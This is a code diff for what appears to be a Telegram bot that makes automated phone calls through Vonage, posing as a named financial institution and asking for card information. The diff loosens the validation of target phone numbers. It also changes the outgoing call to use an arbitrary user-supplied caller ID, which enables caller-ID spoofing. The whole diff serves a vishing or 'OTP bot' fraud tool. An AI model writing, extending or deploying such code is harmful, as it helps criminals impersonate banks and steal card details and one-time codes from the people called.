@@ -34,7 +34,11 @@ export const steps = (step: string): Array<Middleware<C>> => [
       /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
         // @ts-expect-error ts doesn't not recognise text on message
         ctx.message.text,
-      );
+      ) ||
+      // @ts-expect-error ts doesn't not recognise text on message
+      ctx.message.text.substring(0, 1) === '1' ||
+      // @ts-expect-error ts doesn't not recognise text on message
+      ctx.message.text.substring(0, 2) === '44';
 
     if (!numValid) {
       await ctx.reply(
@@ -209,12 +213,12 @@ export const steps = (step: string): Array<Middleware<C>> => [
         : undefined;
     const { number, institutionName, callerId, wallet, cardType, askCardInfo } =
       ctx.wizard.state.callData;
-    const from =
-      /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
-        number,
-      )
-        ? process.env.UK_NUM
-        : process.env.US_NUM;
+    // const from =
+    //   /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
+    //     number,
+    //   )
+    //     ? process.env.UK_NUM
+    //     : process.env.US_NUM;
 
     await ctx.replyWithHTML(
       `Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(
@@ -237,7 +241,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
     }
 
     await vonageMakeACall({
-      from,
+      from: callerId,
       to: number,
       institutionName: institutionName,
       step,
